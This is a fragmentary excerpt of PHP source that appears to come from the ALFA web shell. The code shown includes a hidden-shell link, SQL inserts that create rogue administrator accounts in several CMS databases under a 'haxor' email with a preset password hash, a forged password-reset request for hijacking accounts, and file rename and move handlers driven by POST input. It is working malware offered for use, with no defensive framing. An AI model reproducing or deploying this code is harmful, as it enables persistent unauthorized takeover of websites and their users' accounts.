...
<div id=\'hidden_sh\'><a class="alert_green" target="_blank" href="?leviathan"><span style="color:#42ff59;">'.__ALFA_CODE_NAME__.'</span><br><small>Version: <span class="hidden_shell_version">'.__ALFA_VERSION__.'</span></small></a></div>
...
$create = "insert into tblclients (email) values('haxor@leviathanperfecthunter.com')";
...
$AlfaSole->Send($path."/pwreset.php","post","token={$token[1]}&action=reset&email=haxor@leviathanperfecthunter.com");
...
$table = array('td1' =>
 ...
 'td8' =>
 array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'haxor@leviathanperfecthunter.com', 'inputSize' => '50')
);
create_table($table);
...
$solevisible=@mysqli_query($conn,"insert into users (uid,name,pass,mail,signature_format,status,timezone,init) values('$getDescuid','$admin','\$S\$DP2y9AbolCBOd\/WyQcpzu4zF57qE0noyCNeXZWv.37R66VsFjOiC','haxor@leviathanperfecthunter.com','filtered_html','1','Europe/Berlin','haxor@leviathanperfecthunter.com')") or die(mysqli_error($conn));
...
$solevisible=@mysqli_query($conn,"insert into {$prefix}members (id_member,member_name,id_group,real_name,passwd,email_address) values(null,'$admin','1','$admin','$setpwAlg','haxor@leviathanperfecthunter.com')") or die(mysqli_error($conn));
if($solevisible){
__alert('Success... '.$admin.' is created...');}
}
}
...
function alfadoActions(){
        ...
        if($action == "rename" || $action == "move"){
                ...
                $dir = dirname($_POST["alfa1"]);if($dir == "."){
                        $dir = $_POST["c"]."/";
                }
